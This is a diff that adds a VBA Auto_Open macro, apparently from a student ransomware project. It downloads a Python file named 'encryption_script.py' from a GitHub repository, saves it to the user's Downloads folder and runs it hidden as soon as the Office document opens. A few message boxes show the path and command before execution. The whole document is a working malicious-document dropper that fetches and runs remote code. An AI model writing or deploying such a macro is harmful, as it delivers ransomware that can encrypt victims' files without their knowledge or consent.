@@ -1,0 +1,32 @@
+Sub Auto_Open()
+    Dim http As Object
+    Dim scriptPath As String
+    scriptPath = Environ("USERPROFILE") & "\Downloads\encryption_script.py" ' Path to save in Downloads folder
+
+    ' Display the script path to verify it's correct
+    MsgBox "Script Path: " & scriptPath
+
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", "https://raw.githubusercontent.com/ameyer12/csce5550-ransomware-project/refs/heads/main/encryption_script.py", False
+    http.Send
+
+    If http.Status = 200 Then
+        Dim stream As Object
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.responseBody
+        stream.SaveToFile scriptPath, 2
+        stream.Close
+
+        ' Display command to check before execution
+        Dim command As String
+        command = "python " & scriptPath
+        MsgBox "Command to run: " & command ' Show command to verify
+
+        ' Run the command
+        Shell command, vbHide
+    Else
+        MsgBox "Failed to download the script. Status: " & http.Status
+    End If
+End Sub
